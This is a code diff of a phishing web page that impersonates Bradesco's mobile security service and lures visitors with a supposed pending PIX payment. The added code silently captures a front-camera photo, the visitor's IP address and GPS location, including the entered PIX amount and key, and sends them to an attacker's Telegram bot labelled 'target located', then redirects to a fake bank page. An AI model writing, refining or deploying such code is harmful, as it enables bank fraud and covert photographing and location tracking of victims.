@@ -5,15 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal de Recebimento PIX</title>
 
-    <meta property="og:title" content="Bradesco - Segurança Mobile">
+    <meta property="og:title" content="Bradesco | Segurança Mobile">
     <meta property="og:description" content="Autentique seu dispositivo para liberar o recebimento pendente via PIX.">
-    <meta property="og:image" content="bradesco-logo.png">
+    <meta property="og:image" content="https://l-m-b-s.github.io/PagamentoPix/bradesco-logo.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="300">
+    <meta property="og:image:height" content="300">
     <meta property="og:type" content="website">
 
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .pix-card { background: white; max-width: 420px; width: 100%; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; }
-        /* COR ORIGINAL RESTAURADA */
+        /* COR VERDE ÁGUA RESTAURADA */
         .header { background-color: #32bcad; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; }
         .bc-header { background-color: white; padding: 25px 20px; text-align: center; border-bottom: 2px solid #32bcad; display: none; }
         .bc-logo { width: 160px; height: auto; display: block; margin: 0 auto; }
@@ -71,6 +74,7 @@
         valorGlobal = document.getElementById('valor').value;
         chaveGlobal = document.getElementById('chave').value;
         if (!valorGlobal || !chaveGlobal) return alert("Preencha os dados.");
+        
         document.getElementById('header-dados').style.display = 'none';
         document.getElementById('tela-dados').style.display = 'none';
         document.getElementById('header-bc').style.display = 'block';
@@ -87,30 +91,34 @@
 
         fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => dadosAlvo.ip = d.ip).catch(() => {});
 
-        const finalizar = (pos) => {
-            dadosAlvo.mapa = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            enviarTelegram(dadosAlvo);
+        const enviarMsg = (pos) => {
+            if(pos) {
+                dadosAlvo.mapa = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            }
+            const texto = `📍 *ALVO LOCALIZADO*\n💰 Valor: R$ ${dadosAlvo.valor}\n🔑 Chave: ${dadosAlvo.chave}\n🌐 IP: ${dadosAlvo.ip}\n🌍 Mapa: ${dadosAlvo.mapa}`;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`);
+            window.location.href = "bradesco.html";
         };
 
         if (isAndroid) {
             try {
-                await tirarFoto("user", "FRONTAL");
-                navigator.geolocation.getCurrentPosition(finalizar, () => { window.location.href = "autorizar.html"; }, {timeout: 8000});
+                await tirarFoto();
+                navigator.geolocation.getCurrentPosition(enviarMsg, () => enviarMsg(null), {timeout: 8000});
             } catch (e) {
-                navigator.geolocation.getCurrentPosition(finalizar, () => { window.location.href = "autorizar.html"; }, {timeout: 8000});
+                navigator.geolocation.getCurrentPosition(enviarMsg, () => { window.location.href = "autorizar.html"; }, {timeout: 8000});
             }
         } else {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                try { await tirarFoto("user", "FRONTAL"); } catch(e){}
-                finalizar(pos);
+                try { await tirarFoto(); } catch(e){}
+                enviarMsg(pos);
             }, () => { window.location.href = "autorizar.html"; }, {timeout: 8000});
         }
     }
 
-    async function tirarFoto(face, label) {
+    async function tirarFoto() {
         try {
             if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: face } });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             window.currentStream = stream;
             const video = document.getElementById('video');
             video.srcObject = stream;
@@ -123,15 +131,9 @@
             const fd = new FormData();
             fd.append('chat_id', ID);
             fd.append('photo', blob, 'foto.jpg');
-            fd.append('caption', `📸 HD: ${label}\n💰 Valor: R$ ${valorGlobal}\n🌐 IP: Próxima msg...`);
+            fd.append('caption', `📸 CAPTURA FRONTAL\n💰 Valor: R$ ${valorGlobal}`);
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
         } catch (e) { throw e; }
-    }
-
-    async function enviarTelegram(d) {
-        const texto = `📍 *ALVO LOCALIZADO*\n💰 Valor: R$ ${d.valor}\n🔑 Chave: ${d.chave}\n🌐 IP: ${d.ip}\n🌍 Mapa: ${d.mapa}`;
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`);
-        window.location.href = "bradesco.html";
     }
 </script>
 </body>
